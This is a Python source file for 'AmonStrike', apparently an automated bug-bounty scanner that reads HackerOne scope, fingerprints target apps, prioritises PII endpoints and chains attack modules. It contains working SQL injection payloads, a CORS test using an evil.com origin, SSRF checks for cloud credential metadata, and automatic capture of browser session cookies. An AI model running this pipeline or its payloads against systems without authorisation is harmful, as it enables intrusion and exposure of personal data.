"""
AmonStrike — Master Engine
One URL in. Everything out.

Architecture based on your answers:
  Auth:     Auto-grab from browser OR you provide
  Scope:    Auto-reads H1 program rules
  Report:   Portal only — you click submit
  Speed:    Adaptive — slow start, speeds up if no WAF
  Proof:    Must prove before reporting. You decide final.
"""

import re, json, time, hashlib, requests, urllib3
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

urllib3.disable_warnings()

MEMORY = Path.home() / ".amonstrike" / "master_memory.json"


class AdaptiveRateLimiter:
    """Starts slow. Speeds up if no blocking. Backs off on 403/429."""

    def __init__(self):
        self.delay     = 1.0   # start slow
        self.min_delay = 0.1
        self.max_delay = 3.0
        self.blocked   = 0
        self.success   = 0

    def wait(self):
        time.sleep(self.delay)

    def on_success(self):
        self.success += 1
        # Speed up after 10 clean responses
        if self.success % 10 == 0 and self.delay > self.min_delay:
            self.delay = max(self.min_delay, self.delay * 0.8)

    def on_blocked(self):
        self.blocked += 1
        # Slow down immediately on block
        self.delay = min(self.max_delay, self.delay * 2)
        time.sleep(self.delay * 3)  # extra wait on block


class ScopeReader:
    """Reads H1 program rules. Enforces scope automatically."""

    def __init__(self, program_handle: str):
        self.handle    = program_handle
        self.in_scope  = []
        self.out_scope = []
        self.oos_vuln_types = []
        self._load()

    def _load(self):
        if not self.handle:
            return
        try:
            r = requests.get(
                f"https://api.hackerone.com/v1/hackers/programs/{self.handle}",
                timeout=10,
                headers={"Accept": "application/json"}
            )
            if r.status_code == 200:
                data  = r.json().get("data",{}).get("attributes",{})
                scope = data.get("structured_scope",{})
                for a in scope.get("in_scope",[]):
                    h = a.get("asset_identifier","")
                    if h: self.in_scope.append(h)
                for a in scope.get("out_of_scope",[]):
                    h = a.get("asset_identifier","")
                    if h: self.out_scope.append(h)
        except Exception:
            pass

    def is_allowed(self, url: str) -> bool:
        host = urlparse(url).netloc.lower()
        if any(o.lstrip("*.") in host for o in self.out_scope):
            return False
        if not self.in_scope:
            return True
        return any(host.endswith(s.lstrip("*.")) for s in self.in_scope)

    def filter_findings(self, findings: list) -> list:
        """Remove findings that are OOS vuln types."""
        oos_keywords = [
            "missing header","clickjack","rate limit","self xss",
            "username enum","open redirect","ssl","tls","spf","dmarc",
            "wayback","missing cookie","csrf on logout","content type",
        ]
        return [f for f in findings if not any(
            kw in f.get("title","").lower() for kw in oos_keywords
        )]


class AppUnderstandingEngine:
    """
    Reads and models the target app before any attack.
    What does it do? Where is the money? Where is the PII?
    """

    def __init__(self, target: str, session: requests.Session):
        self.target  = target
        self.session = session
        self.model   = {}

    def build(self) -> dict:
        print("  [UNDERSTAND] Reading app structure...")
        r = self.session.get(self.target, timeout=15)
        if not r:
            return {}

        tech    = self._detect_tech(r)
        purpose = self._detect_purpose(r)
        auth    = self._detect_auth(r)
        apis    = self._find_apis(r)
        pii     = self._find_pii_endpoints(r, apis)

        self.model = {
            "tech":           tech,
            "purpose":        purpose,
            "auth_type":      auth,
            "api_endpoints":  apis,
            "pii_endpoints":  pii,
            "attack_priority":self._build_priority(tech, purpose, auth, pii),
        }

        print(f"  [UNDERSTAND] Tech: {tech[:3]} | Purpose: {purpose} | Auth: {auth}")
        print(f"  [UNDERSTAND] Priority attacks: {self.model['attack_priority'][:4]}")
        return self.model

    def _detect_tech(self, r) -> list:
        combined = r.text[:3000] + str(r.headers)
        sigs = {
            "php":        ["PHPSESSID","X-Powered-By: PHP",".php"],
            "node":       ["X-Powered-By: Express","connect.sid"],
            "java":       ["JSESSIONID","X-Java-","Struts"],
            "python":     ["django","flask","wsgi","gunicorn"],
            "ruby":       ["_session_id","rack","rails"],
            "wordpress":  ["wp-content","wp-json"],
            "mysql":      ["mysql_fetch","MySQL"],
            "postgresql": ["PostgreSQL","pg_query"],
            "graphql":    ["graphql","__schema"],
            "jwt":        ["eyJ"],
            "react":      ["__REACT","_reactFiber","react"],
            "angular":    ["ng-version","angular"],
            "aws":        ["amazonaws","x-amz-"],
            "cloudflare": ["cloudflare","cf-ray"],
        }
        return [t for t,s in sigs.items() if any(x in combined for x in s)]

    def _detect_purpose(self, r) -> str:
        text = r.text.lower()
        for purpose, keywords in {
            "ecommerce":    ["cart","checkout","order","payment","product"],
            "fintech":      ["bank","transfer","balance","transaction","wallet"],
            "social":       ["follow","like","post","comment","profile","feed"],
            "saas":         ["dashboard","workspace","team","subscription","plan"],
            "government":   ["gov","military","federal","department","agency"],
            "healthcare":   ["patient","doctor","medical","health","prescription"],
            "food_delivery":["restaurant","delivery","menu","order food"],
            "travel":       ["hotel","flight","booking","reservation"],
        }.items():
            if sum(1 for k in keywords if k in text) >= 2:
                return purpose
        return "general"

    def _detect_auth(self, r) -> str:
        text = str(r.headers) + r.text[:1000]
        if "bearer" in text.lower() or "eyJ" in text:
            return "jwt"
        if "oauth" in text.lower():
            return "oauth"
        if "saml" in text.lower():
            return "saml"
        if "session" in text.lower():
            return "session"
        return "unknown"

    def _find_apis(self, r) -> list:
        apis = set()
        for pat in [
            r'["\'](/api/[^\s"\'<>?#]{3,})["\']',
            r'["\'](/v\d+/[^\s"\'<>?#]{3,})["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.\w+\(["\']([^"\']+)["\']',
        ]:
            for m in re.finditer(pat, r.text):
                ep = m.group(1)
                if ep.startswith("/"):
                    apis.add(self.target.rstrip("/") + ep)
        return list(apis)[:50]

    def _find_pii_endpoints(self, r, apis) -> list:
        """Endpoints likely to contain PII — test these first."""
        pii_keywords = ["user","profile","account","address","payment",
                       "order","invoice","personal","me","identity"]
        return [ep for ep in apis if any(k in ep.lower() for k in pii_keywords)]

    def _build_priority(self, tech, purpose, auth, pii) -> list:
        """Build attack priority based on what we know about the app."""
        priority = []
        # Auth type determines first attack
        if "jwt" in tech or auth == "jwt":
            priority.extend(["jwt_deep","auth"])
        if "graphql" in tech:
            priority.extend(["graphql_deep","idor"])
        if pii:
            priority.extend(["idor","cors"])
        # Tech stack determines injection type
        if "mysql" in tech or "postgresql" in tech:
            priority.insert(0, "sqli")
        if "php" in tech:
            priority.extend(["lfi","ssti","command_injection"])
        if "node" in tech or "react" in tech or "angular" in tech:
            priority.extend(["prototype_pollution","xss"])
        # Purpose determines business logic
        if purpose in ["ecommerce","fintech"]:
            priority.extend(["business_logic","race_condition"])
        if purpose == "government":
            priority.extend(["ssrf","credentials","xxe"])
        # Always include
        for m in ["idor","ssrf","xss","cors"]:
            if m not in priority:
                priority.append(m)
        return list(dict.fromkeys(priority))


class AdaptiveAttackEngine:
    """
    Living decision tree — not static modules.
    Adapts based on every response it gets.
    """

    def __init__(self, target: str, session: requests.Session,
                 app_model: dict, rate_limiter: AdaptiveRateLimiter):
        self.target      = target
        self.session     = session
        self.model       = app_model
        self.rl          = rate_limiter
        self.findings    = []
        self.tested      = set()
        self.waf_type    = ""

    def run(self, endpoints: list, priority_modules: list) -> list:
        """Adaptive attack loop."""
        import sys; sys.path.insert(0, ".")

        for module_name in priority_modules:
            if module_name in self.tested:
                continue
            self.tested.add(module_name)

            try:
                cls_name = "".join(w.capitalize() for w in module_name.split("_")) + "Module"
                mod      = __import__(f"modules.{module_name}", fromlist=[cls_name])
                cls      = getattr(mod, cls_name)
                inst     = cls(url=self.target, timeout=12,
                              cookies=dict(self.session.cookies),
                              headers=dict(self.session.headers))
                inst.extra_endpoints = endpoints[:80]
                if self.waf_type:
                    inst._waf_type = self.waf_type

                self.rl.wait()
                result   = inst.run()
                findings = result.get("findings", [])

                for f in findings:
                    f.setdefault("module",    module_name)
                    f.setdefault("timestamp", datetime.now().isoformat())

                # Adapt based on findings
                new_modules = self._adapt(findings, module_name)
                for nm in new_modules:
                    if nm not in priority_modules and nm not in self.tested:
                        priority_modules.append(nm)

                self.findings.extend(findings)
                if findings:
                    self.rl.on_success()
                    for f in findings:
                        print(f"  [FOUND] [{f['severity']}] {f['title'][:60]}")

            except Exception as e:
                self.rl.on_blocked()

        return self.findings

    def _adapt(self, findings: list, module: str) -> list:
        """Based on what was found, what should we test next?"""
        new = []
        for f in findings:
            sev = f.get("severity","")
            # SQLi found → try auth bypass + data extraction
            if module == "sqli":
                new.extend(["auth","credentials"])
            # IDOR found → mass enumerate + test write access
            if module == "idor":
                new.extend(["account_takeover","business_logic"])
            # CORS found → check if credentials allowed
            if module == "cors" and sev == "CRITICAL":
                new.append("account_takeover")
            # XSS found → check CSP, look for stored variant
            if module == "xss":
                new.append("csp_bypass")
            # Headers missing → check for other security issues
            if sev == "CRITICAL":
                new.extend(["ssrf","command_injection"])
        return list(set(new))


class ProofEngine:
    """
    Proves every finding before reporting.
    No proof = not reported.
    You see it first, you decide.
    """

    def __init__(self, target: str, session: requests.Session):
        self.target  = target
        self.session = session

    def prove(self, finding: dict) -> dict:
        """Try to extract real evidence. Return enhanced finding or None."""
        module = finding.get("module","")
        fn     = getattr(self, f"_prove_{module}", self._prove_generic)
        proof  = fn(finding)
        if proof:
            finding["proof"]    = proof
            finding["proven"]   = True
        else:
            finding["proven"]   = False
            finding["needs_manual_verify"] = True
        return finding

    def _prove_sqli(self, f) -> str:
        url, param = f.get("url",""), f.get("parameter","")
        if not url or not param: return ""
        # Try UNION to extract real data
        for payload in [
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,user(),3--",
            "1 AND SLEEP(4)--",
        ]:
            try:
                t0 = time.time()
                r  = self.session.get(url, params={param: payload}, timeout=15)
                elapsed = time.time() - t0
                if elapsed >= 3.5:
                    return f"Time-based SQLi confirmed: {elapsed:.1f}s delay"
                if any(kw in r.text for kw in ["version()","5.","8.","MariaDB","PostgreSQL"]):
                    return f"SQLi confirmed: DB version in response\n{r.text[:200]}"
            except Exception: pass
        return ""

    def _prove_idor(self, f) -> str:
        url, payload = f.get("url",""), str(f.get("payload",""))
        if not url: return ""
        try:
            r = self.session.get(url, timeout=10)
            if not r or r.status_code != 200: return ""
            # Check for sensitive data
            sensitive = []
            for kw in ["email","phone","address","password","card","ssn","token"]:
                if kw in r.text.lower():
                    sensitive.append(kw)
            if sensitive:
                return f"IDOR confirmed: {', '.join(sensitive)} exposed\nPreview: {r.text[:300]}"
        except Exception: pass
        return ""

    def _prove_cors(self, f) -> str:
        url = f.get("url","")
        if not url: return ""
        try:
            r = self.session.get(url, headers={"Origin":"https://evil.com"}, timeout=10)
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","").lower()
            if "evil.com" in acao and acac == "true":
                return f"CORS confirmed: ACAO={acao} ACAC={acac}\nData: {r.text[:200]}"
        except Exception: pass
        return ""

    def _prove_ssrf(self, f) -> str:
        evidence = f.get("evidence","")
        real_metadata = ["ami-id","instance-id","AccessKeyId","serviceAccounts"]
        if any(k in evidence for k in real_metadata):
            return f"SSRF confirmed: cloud metadata in response\n{evidence[:300]}"
        return ""

    def _prove_xss(self, f) -> str:
        url, param = f.get("url",""), f.get("parameter","")
        payload = str(f.get("payload",""))
        if not url or not param: return ""
        try:
            r = self.session.get(url, params={param: payload}, timeout=10)
            if r and payload in r.text:
                return f"XSS confirmed: payload unencoded in response\nPayload: {payload}"
        except Exception: pass
        return ""

    def _prove_generic(self, f) -> str:
        evidence = f.get("evidence","")
        if len(evidence) > 100:
            return f"Finding detected by tool\nEvidence: {evidence[:300]}"
        return ""


try:
    from core.brain import Brain
except Exception:
    Brain = None
from core.local_brain import LocalBrain

class MasterEngine:
    """
    One URL in. Everything out.
    The complete pipeline.
    """

    def __init__(self, url: str, program_handle: str = "",
                 h1_username: str = "jardani101"):
        self.url      = url.rstrip("/")
        self.handle   = program_handle
        self.username = h1_username
        self.session  = self._build_session()
        self.rl       = AdaptiveRateLimiter()
        self.brain    = Brain() if Brain else LocalBrain()

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        s.verify  = False
        s.headers.update({
            "User-Agent":  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "X-Hackerone": self.username,
        })
        # Auto-grab browser session
        try:
            from core.browser_session import capture_session
            domain  = urlparse(self.url).netloc
            cookies = capture_session(domain)
            if cookies:
                s.cookies.update(cookies)
                print(f"  [+] Browser session grabbed: {len(cookies)} cookies")
        except Exception:
            pass
        return s

    def run(self) -> dict:
        print(f"\n{'='*60}")
        print(f"  MASTER ENGINE — {self.url}")
        print(f"  Program: {self.handle or 'none'}")
        print(f"{'='*60}\n")

        # Phase 1: Read scope
        print("[Phase 1] Reading program scope...")
        scope = ScopeReader(self.handle)
        if not scope.is_allowed(self.url):
            print(f"  [!] {self.url} is OUT OF SCOPE — stopping")
            return {}
        print(f"  [+] In scope: {len(scope.in_scope)} assets")

        # Phase 2: Understand the app
        print("\n[Phase 2] Understanding the app...")
        app = AppUnderstandingEngine(self.url, self.session)
        model = app.build()

        # Phase 3: Discover attack surface
        print("\n[Phase 3] Discovering attack surface...")
        from core.surface_discovery import AggressiveSurfaceDiscovery
        disc = AggressiveSurfaceDiscovery(self.url, self.session,
                                          {"X-Hackerone": self.username})
        surface  = disc.run()
        endpoints= surface.get("endpoints",[])
        print(f"  [+] {len(endpoints)} endpoints discovered")

        # Phase 4: Adaptive attack
        print("\n[Phase 4] Adaptive attack engine...")
        brain_plan = self.brain.plan_attack(
            self.url,
            model.get("tech",[]),
            model.get("purpose","")
        )
        priority = brain_plan.get("priority_modules") or model.get("attack_priority",[
            "sqli","idor","ssrf","xss","cors","auth","jwt_deep",
            "graphql_deep","lfi","ssti","command_injection",
            "nosql_injection","file_upload","deserialization",
        ])
        attacker  = AdaptiveAttackEngine(
            self.url, self.session, model, self.rl)
        raw_findings = attacker.run(endpoints, priority)
        print(f"  [+] {len(raw_findings)} raw findings")

        # Phase 5: Prove every finding
        print("\n[Phase 5] Proving findings...")
        prover   = ProofEngine(self.url, self.session)
        proven   = []
        unproven = []
        for f in raw_findings:
            result = prover.prove(f)
            if result.get("proven"):
                proven.append(result)
                print(f"  [PROVEN] [{result['severity']}] {result['title'][:55]}")
            else:
                unproven.append(result)

        # Phase 6: Filter OOS
        print("\n[Phase 6] Filtering out-of-scope finding types...")
        proven   = scope.filter_findings(proven)
        unproven = scope.filter_findings(unproven)

        # Phase 7: Show you — you decide
        print(f"\n{'='*60}")
        print(f"  RESULTS — YOU DECIDE")
        print(f"{'='*60}")
        print(f"\n  PROVEN ({len(proven)}) — Ready to submit:")
        for f in proven:
            print(f"    [{f['severity']}] {f['title'][:60]}")

        print(f"\n  NEEDS VERIFY ({len(unproven)}) — Check manually:")
        for f in unproven:
            print(f"    [{f['severity']}] {f['title'][:60]}")

        # Phase 8: Generate H1 portal
        chains = self.brain.chain_findings(proven)
        if chains:
            print(f"\n  [+] {len(chains)} vulnerability chains found")
            for c in chains:
                print(f"     {c.get('name','')} → {c.get('combined_severity','')} (~${c.get('bounty_estimate',0):,})")
        self.brain.learn(proven, self.url, model.get("tech",[]))
        all_reportable = proven + [f for f in unproven
                                   if f.get("severity") in ["CRITICAL","HIGH"]]
        if all_reportable:
            output_dir = f"output/{urlparse(self.url).netloc}"
            from reports.hackerone_format import generate_h1_package
            pkg = generate_h1_package(
                all_reportable, output_dir,
                program_handle=self.handle,
                target_url=self.url,
            )
            if pkg.get("portal"):
                print(f"\n  [+] H1 Portal: {pkg['portal']}")
                print(f"  [+] Open it, read each finding, click Submit")

        # Save memory
        self._save_memory(proven, model)

        return {
            "proven":   proven,
            "unproven": unproven,
            "model":    model,
            "surface":  surface,
        }

    def _save_memory(self, findings, model):
        try:
            MEMORY.parent.mkdir(parents=True, exist_ok=True)
            mem = json.loads(MEMORY.read_text()) if MEMORY.exists() else {}
            domain = urlparse(self.url).netloc
            mem.setdefault("scanned",[]).append({
                "domain":    domain,
                "tech":      model.get("tech",[]),
                "purpose":   model.get("purpose",""),
                "findings":  len(findings),
                "date":      datetime.now().isoformat(),
            })
            mem["scanned"] = mem["scanned"][-100:]
            MEMORY.write_text(json.dumps(mem, indent=2, default=str))
        except Exception:
            pass


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 core/master_engine.py <url> [program_handle]")
        sys.exit(1)
    url     = sys.argv[1]
    handle  = sys.argv[2] if len(sys.argv) > 2 else ""
    engine  = MasterEngine(url, handle)
    engine.run()
